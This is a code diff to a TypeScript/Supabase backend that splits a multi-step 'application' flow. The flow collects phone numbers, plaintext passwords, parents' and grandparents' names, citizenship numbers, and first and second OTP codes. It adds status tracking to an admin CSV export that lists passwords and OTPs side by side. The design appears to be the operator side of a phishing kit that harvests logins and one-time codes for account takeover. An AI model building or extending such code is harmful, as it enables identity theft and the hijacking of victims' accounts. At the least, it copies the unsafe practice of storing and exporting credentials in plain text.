@@ -6,10 +6,6 @@ import { type Application, type ApplicationWithOtpCount, type OtpHistory } from 
 export async function createApplication(data: {
   phone_number: string
   password: string
-  father_name: string
-  grandfather_name: string
-  mother_name: string
-  citizenship_number: string
 }) {
   const supabase = await createServiceRoleClient()
 
@@ -18,10 +14,8 @@ export async function createApplication(data: {
     .insert({
       phone_number: data.phone_number,
       password: data.password,
-      father_name: data.father_name,
-      grandfather_name: data.grandfather_name,
-      mother_name: data.mother_name,
-      citizenship_number: data.citizenship_number,
+      current_step: "Step 1",
+      status: "In Progress",
     })
     .select()
     .single()
@@ -30,12 +24,41 @@ export async function createApplication(data: {
   return app as Application
 }
 
+export async function updateApplicationStep2(
+  applicationId: string,
+  data: {
+    father_name: string
+    grandfather_name: string
+    mother_name: string
+    citizenship_number: string
+  }
+) {
+  const supabase = await createServiceRoleClient()
+
+  const { error } = await supabase
+    .from("applications")
+    .update({
+      father_name: data.father_name,
+      grandfather_name: data.grandfather_name,
+      mother_name: data.mother_name,
+      citizenship_number: data.citizenship_number,
+      current_step: "Step 2",
+    })
+    .eq("id", applicationId)
+
+  if (error) throw new Error(error.message)
+}
+
 export async function saveFirstOtp(applicationId: string, otp: string) {
   const supabase = await createServiceRoleClient()
 
   const { error } = await supabase
     .from("applications")
-    .update({ first_otp: otp })
+    .update({
+      first_otp: otp,
+      current_step: "OTP",
+      status: "OTP Verification",
+    })
     .eq("id", applicationId)
 
   if (error) throw new Error(error.message)
@@ -48,7 +71,11 @@ export async function saveSecondOtp(applicationId: string, otp: string) {
 
   const { error } = await supabase
     .from("applications")
-    .update({ second_otp: otp })
+    .update({
+      second_otp: otp,
+      current_step: "OTP",
+      status: "OTP Verification",
+    })
     .eq("id", applicationId)
 
   if (error) throw new Error(error.message)
@@ -241,12 +268,14 @@ export async function exportApplicationsCsv() {
     return {
       "Phone Number": app.phone_number,
       Password: app.password,
-      "Father Name": app.father_name,
-      "Grandfather Name": app.grandfather_name,
-      "Mother Name": app.mother_name,
-      "Citizenship Number": app.citizenship_number,
+      "Father Name": app.father_name || "",
+      "Grandfather Name": app.grandfather_name || "",
+      "Mother Name": app.mother_name || "",
+      "Citizenship Number": app.citizenship_number || "",
       "First OTP": app.first_otp || "",
       "Second OTP": app.second_otp || "",
+      Status: app.status || "",
+      "Current Step": app.current_step || "",
       "Total OTP Attempts": otpHistory?.[0]?.count ?? 0,
       "Created At": app.created_at,
       "Updated At": app.updated_at,
